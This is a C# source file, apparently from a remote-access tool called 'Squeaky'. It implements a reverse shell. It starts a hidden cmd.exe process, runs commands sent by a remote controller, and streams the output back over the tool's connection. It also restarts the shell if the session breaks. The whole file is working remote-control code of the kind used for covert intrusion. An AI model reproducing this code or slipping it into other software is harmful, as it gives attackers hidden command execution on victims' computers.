using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Text;
using Squeaky.Shared;
using System;

namespace Squeaky.Client.Utilities
{
    static class ReverseShell
    {
        private static Process Shell = new Process();
        private static ProcessStartInfo P = new ProcessStartInfo("cmd")
        {
            CreateNoWindow = true,
            UseShellExecute = false,
            RedirectStandardError = true,
            RedirectStandardInput = true,
            RedirectStandardOutput = true
        };

        public static void Init()
        {
            Shell.StartInfo = P;
            Shell.Start();

            new Thread(MonitorStdOut).Start();
            new Thread(MonitorStdErr).Start();
        }

        public static void Command(string command)
        {
            if (command == "disconnect")
            {
                try
                {
                    Shell.Kill();
                    Shell.Dispose();
                    Shell = null;

                    Connection.SendMessage(ProcessCodes.ReverseShell, "----- Session closed -----");
                }
                catch { }
            }
            else Shell.StandardInput.WriteLine(command);
        }

        private static void ReadStream(int firstCharRead, StreamReader streamReader)
        {
            var streamBuffer = new StringBuilder();

            streamBuffer.Append((char)firstCharRead);

            while (streamReader.Peek() > -1)
            {
                var ch = streamReader.Read();

                streamBuffer.Append((char)ch);

                if (ch == '\n')
                    SendAndFlushBuffer(ref streamBuffer);
            }
            SendAndFlushBuffer(ref streamBuffer);
        }

        private static void SendAndFlushBuffer(ref StringBuilder textBuffer)
        {
            if (textBuffer.Length == 0) return;

            if (string.IsNullOrEmpty(textBuffer.ToString())) return;

            Connection.SendMessage(ProcessCodes.ReverseShell, textBuffer.ToString());

            textBuffer.Clear();
        }

        private static void MonitorStdOut()
        {
            try
            {
                int ch;

                while (Shell != null && !Shell.HasExited && (ch = Shell.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, Shell.StandardOutput);
                }
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    Connection.SendMessage(ProcessCodes.ReverseShell, "----- Session closed unexpectadly -----");

                    Init();
                }
            }
        }

        private static void MonitorStdErr()
        {
            try
            {
                int ch;

                while (Shell != null && !Shell.HasExited && (ch = Shell.StandardError.Read()) > -1)
                {
                    ReadStream(ch, Shell.StandardError);
                }
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    Connection.SendMessage(ProcessCodes.ReverseShell, "----- Session closed unexpectadly -----");

                    Init();
                }
            }
        }
    }
}
